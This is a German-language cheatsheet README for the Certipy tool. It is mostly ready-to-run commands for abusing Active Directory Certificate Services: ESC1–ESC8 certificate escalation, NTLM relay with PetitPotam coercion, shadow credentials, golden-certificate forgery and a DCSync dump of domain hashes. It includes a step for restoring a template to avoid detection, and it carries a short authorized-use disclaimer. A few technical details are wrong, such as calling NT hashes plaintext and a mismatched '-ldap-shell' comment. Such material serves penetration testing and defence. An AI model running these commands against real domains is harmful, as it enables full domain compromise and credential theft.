<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏛️ Certipy – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```
<p align="center">
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerabilities-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<p align="center">
  <b>🔑 Umfassendes Tool zum Aufzählen und Ausnutzen von Fehlkonfigurationen der Active Directory-Zertifikatdienste (AD CS)</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Einführung](#-Einführung)
- [Warum AD CS-Missbrauch?](#-why-ad-cs-abuse)
- [Installation](#-Installation)
- [Übersicht über Certipy-Unterbefehle](#-certipy-subcommands-overview)
- [Enumeration & Discovery (`find`)](#-enumeration--discovery-find)
- [Die ESC-Schwachstellenmatrix](#-the-esc-schwachstellen-matrix)
  - [ESC1: Alt-Name des Antragstellers liefert Betreff (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2: EKU oder SubCA für jeden Zweck](#esc2-any-zweck-eku-or-subca)
  - [ESC3: Zertifikatsanforderungsagent](#esc3-certificate-request-agent)
  - [ESC4: Vulnerable Template Access Control (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 aktiviert](#esc6-editf_attributesubjectaltname2-enabled)
  - [ESC7: Vulnerable CA Access Control](#esc7-vulnerable-ca-access-control)
  - [ESC8: NTLM-Relay zur HTTP-Webregistrierung](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 & ESC10: Starke Zertifikatszuordnungsfehler](#esc9--esc10-strong-certificate-mapping-flaws)
- [Shadow Credentials (`shadow`)](#-shadow-credentials-shadow)
- [Goldene Zertifikate (`forge`)](#-golden-certificates-forge)
- [Authentifizierung mit PFX (`auth`)](#-authenticating-with-pfx-auth)
- [Real-World Attack Workflows](#-real-world-attack-workflows)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Tipps und Best Practices](#-tips--best-practices)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
- [Ressourcen](#-Ressourcen)

---

## 🎯 Einführung

**Certipy** (erstellt von Oliver Lyak) ist das führende Python-basierte Tool zum Aufzählen und Nutzen von Active Directory-Zertifikatdiensten (**AD CS**). AD CS ist die Public Key Infrastructure (PKI)-Implementierung von Microsoft für Active Directory-Unternehmensnetzwerke, die häufig für die Smartcard-Anmeldung, VPNs, S/MIME und interne TLS-Verschlüsselung verwendet wird.

Da falsche Konfigurationen von Zertifikaten häufig dazu führen, dass unprivilegierte Domänenbenutzer Zertifikate als Domänenadministratoren oder Domänencontroller anfordern können, stellt der AD CS-Missbrauch einen der zuverlässigsten und wirkungsvollsten Domäneneskalationsvektoren in modernen Unternehmenspenetrationstests dar.

---

## ⚖️ Warum AD CS-Missbrauch?

- ⚡ **Sofortige Domäneneskalation:** Falsch konfigurierte Zertifikatvorlagen führen oft innerhalb von Sekunden zu einer domänenweiten Kompromittierung.
- 🔑 **Stealthy & Persistent:** Gestohlene Zertifikate oder gefälschte Golden Certificates können jahrelang gültig bleiben, ohne Standardwarnungen bei Passwortänderungen auszulösen.
- 🔄 **PKINIT zu NT-Hash:** Certipy authentifiziert angeforderte `.pfx`-Zertifikate über Kerberos PKINIT und ruft den Klartext-NT-Hash des Ziels direkt vom KDC ab.

---

## 📥 Installation

### Verwendung von pipx (empfohlen)
```bash
pipx install certipy-ad
```
### Aus dem GitHub-Repository
```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```
### Verifizierung
```bash
certipy -h
```
---

## 🧭 Übersicht über Certipy-Unterbefehle

| Unterbefehl | Funktion |
|------------|----------|
| `find` | Zählen Sie Zertifizierungsstellen und Vorlagen auf und erkennen Sie ESC-Schwachstellen |
| `req` | Zertifikate von anfälligen Vorlagen anfordern |
| `auth` | Authentifizieren Sie sich mit `.pfx`-Zertifikaten, um TGT- und NT-Hash abzurufen |
| `ca` | Auflisten und Ändern der CA-Konfigurationseinstellungen |
| `template` | Einstellungen der Zertifikatvorlage ändern (nützlich in ESC4) |
| `account` | Active Directory-Computerkonten verwalten (MachineAccountQuota) |
| `shadow` | Schattenanmeldeinformationen ausnutzen (`msDS-KeyCredentialLink`) |
| `forge` | Goldene Zertifikate mithilfe eines gestohlenen privaten CA-Schlüssels fälschen |

---

## 🔍 Enumeration & Discovery (`find`)

Beginnen Sie mit der Identifizierung der Unternehmenszertifizierungsstelle (CA) und der Suche nach anfälligen Vorlagen:
```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```
---

## 💥 Die ESC-Schwachstellenmatrix

### ESC1: Anmelder liefert Betreff-Alt-Name (SAN)

**Zustand:**
– Benutzer mit geringen Berechtigungen haben Registrierungsrechte (`Client Authentication` EKU aktiviert).
- Die Vorlage gibt `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` an (ermöglicht dem Anforderer die Angabe eines beliebigen alternativen Antragstellernamens, z. B. des Domänenadministrators).

**Ausbeutung:**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*Ausgabe ergibt Administrator-TGT und Klartext-NT-Hash!*

---

### ESC2: EKU oder SubCA für jeden Zweck

**Zustand:**
– Die Vorlage gibt `Any Purpose` EKU an oder es ist keine EKU definiert.
- Kann für jeden Zweck verwendet werden, einschließlich der Client-Authentifizierung.

**Ausbeutung:**
Wird auf die gleiche Weise wie ESC1 ausgenutzt oder in Kombination mit ESC3 verwendet, um ein Registrierungsagentenzertifikat zu erhalten.

---

### ESC3: Zertifikatanforderungsagent

**Zustand:**
- Die Vorlage verfügt über die EKU `Certificate Request Agent` (Enrollment Agent).
– Ermöglicht das Anfordern von Zertifikaten im Namen eines anderen Benutzers über sekundäre Vorlagen hinweg.

**Ausbeutung:**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
---

### ESC4: Anfällige Template Access Control (ACL)

**Zustand:**
– Benutzer mit geringen Berechtigungen verfügen über `WriteOwner`-, `WriteDacl`- oder `WriteProperty`-Rechte für eine Zertifikatvorlage.

**Ausbeutung:**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```
---

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Aktiviert

**Zustand:**
- Die Zertifizierungsstelle hat das `EDITF_ATTRIBUTESUBJECTALTNAME2`-Flag gesetzt, sodass jede Zertifikatsanforderung unabhängig von den Vorlageneinstellungen beliebige SANs angeben kann!

**Ausbeutung:**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```
---

### ESC7: Anfällige CA-Zugriffskontrolle

**Zustand:**
- Der Benutzer verfügt über `ManageCA`- oder `ManageCertificates`-Rechte auf der CA selbst.

**Ausbeutung:**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```
---

### ESC8: NTLM-Relay zur HTTP-Webregistrierung

**Zustand:**
– Bei der Zertifizierungsstelle ist der Web Enrollment HTTP-Endpunkt (`/certsrv/`) mit NTLM-Authentifizierung ohne EPA (Extended Protection for Authentication) und HTTPS aktiviert.

**Ausbeutungs-Workflow:**
1. Starten Sie `ntlmrelayx` und verweisen Sie auf CA Web Enrollment:
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2. Erzwungene Maschinenauthentifizierung über PetitPotam oder PrinterBug auslösen:
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. `ntlmrelayx` leitet die NTLM-Authentifizierung des Computerkontos des Domänencontrollers weiter, fordert ein Computerzertifikat an und gibt base64 `.pfx` aus.
4. Authentifizieren Sie sich mit Certipy als Domänencontroller:
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. Verwenden Sie den NT-Hash des DC, um einen vollständigen DCSync-Dump mit `impacket-secretsdump` durchzuführen.

---

## 👥 Shadow-Anmeldeinformationen (`shadow`)

Wenn ein kompromittiertes Konto Schreibzugriff auf das `msDS-KeyCredentialLink`-Attribut eines anderen Kontos hat:
```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```
---

## 👑 Goldene Zertifikate (`forge`)

Wenn Sie die Zertifizierungsstelle kompromittiert und ihren privaten Schlüssel extrahiert haben:
```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```
---

## 🔑 Authentifizierung mit PFX (`auth`)
```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
---

## 🎬 Praxisnahe Angriffsworkflows

### Schließe die ESC1-Domänenübernahme in 3 Befehlen ab
```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```
---

## 📊 Kurzreferenztabelle

| Aufgabe | Befehl |
|------|---------|
| **AD CS aufzählen** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **Zertifikat anfordern (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **PFX authentifizieren** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **Vorlage ändern (ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **Shadow-Anmeldeinformationen** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **CA-Rechte verwalten** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **Goldenes Zertifikat schmieden** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 Tipps und Best Practices

1. **Überprüfen Sie die DC-Taktsynchronisierung:**
   Kerberos PKINIT erfordert, dass Ihre Systemzeit innerhalb von 5 Minuten mit dem Domänencontroller synchronisiert wird. Laufen:
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **KDC_ERR_PADATA_TYPE_NOSUPP behandeln:**
   Wenn `certipy auth` mit diesem Fehler fehlschlägt, ist auf dem Domänencontroller kein gültiges Domänencontrollerzertifikat für PKINIT installiert. Verwenden Sie in diesem Fall die LDAP- oder SChannel-Authentifizierung.
3. **ESC4-Vorlagen immer bereinigen:**
   Behalten Sie beim Ändern von Zertifikatvorlagen immer die Sicherungskonfiguration (`-configuration <FILE>.json`) bei und wenden Sie sie erneut an, um zu vermeiden, dass die Umgebung angreifbar wird oder Betriebsausfälle verursacht werden.

---

## ⚠️ Rechtlicher Haftungsausschluss

> **WICHTIG:** Angriffe auf Active Directory-Zertifikatdienste gewähren kritischen, hochwirksamen administrativen Zugriff über Domänennetzwerke hinweg. Certipy darf nur bei autorisierten Penetrationstests, Red-Team-Übungen und ethischen Sicherheitsaudits mit schriftlicher Genehmigung durchgeführt werden.

---

## 📚 Ressourcen

- [Offizielles GitHub-Repository von Certipy](https://github.com/ly4k/Certipy)
- [Certified Pre-Owned Whitepaper (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
– [AD CS-Angriffspfade und -Schutz (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)